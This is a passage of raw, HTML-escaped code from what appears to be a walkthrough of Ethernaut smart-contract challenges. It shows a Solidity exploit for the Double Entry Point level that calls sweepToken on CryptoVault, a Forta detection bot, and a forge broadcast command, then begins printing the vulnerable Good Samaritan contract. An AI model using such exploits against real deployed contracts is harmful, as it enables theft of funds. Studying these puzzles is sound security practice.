&lt;&#x2F;span&gt;&lt;span&gt;    address public delegatedFrom &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatedFrom&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Legacy Token Address
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        CryptoVault cv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;CryptoVault&lt;&#x2F;span&gt;&lt;span&gt;(cryptovault)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        cv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sweepToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(delegatedFrom))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DetectionBot{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    DoubleEntryPoint public det &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DoubleEntryPoint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public  cryptovault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cryptoVault&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;handleTransaction&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata msgData&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address origSender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;origSender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldataload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(origSender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt;cryptovault ){
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Forta&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;raiseAlert&lt;&#x2F;span&gt;&lt;span&gt;(user)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; raise alert of Forta contract
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;DoubleEntryPointSolve.s.sol:DoubleEntryPointSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;27-good-samaritan&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#27-good-samaritan&quot; aria-label=&quot;Anchor link for: 27-good-samaritan&quot;&gt;27 Good Samaritan&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;GoodSamaritan.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;utils&#x2F;Address.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GoodSamaritan {
&lt;&#x2F;span&gt;&lt;span&gt;    Wallet public wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Coin public coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Wallet&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Coin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(wallet))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setCoin&lt;&#x2F;span&gt;&lt;span&gt;(coin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requestDonation&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool enoughBalance&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; donate 10 coins to requester
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;donate10&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;(bytes memory err) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NotEnoughBalance()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(err)) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; send the coins left
&lt;&#x2F;span&gt;&lt;span&gt;                wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferRemainder&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Coin {
&lt;&#x2F;span&gt;&lt;span&gt;    using Address for address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256) public balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;InsufficientBalance&lt;&#x2F;span&gt;&lt;span&gt;(uint256 current&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 required)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address wallet_) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; one million coins for Good Samaritan initially
&lt;&#x2F;span&gt;&lt;span&gt;        balances[wallet_] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address dest_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount_&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 currentBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; transfer only occurs if balance is enough
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(amount_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;currentBalance) {
&lt;&#x2F;span&gt;&lt;span&gt;            balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;amount_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            balances[dest_] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;amount_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;if(dest_.isContract()) { 
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(dest_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;code&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; notify contract 
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;INotifyable&lt;&#x2F;span&gt;&lt;span&gt;(dest_)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(amount_)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;InsufficientBalance&lt;&#x2F;span&gt;&lt;span&gt;(currentBalance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount_)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Wallet {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; The owner of the wallet instance
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Coin public coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;OnlyOwner&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onlyOwner&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;owner) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;OnlyOwner&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;donate10&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address dest_&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; check balance left
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; donate 10 coins
&lt;&#x2F;span&gt;&lt;span&gt;            coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(dest_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
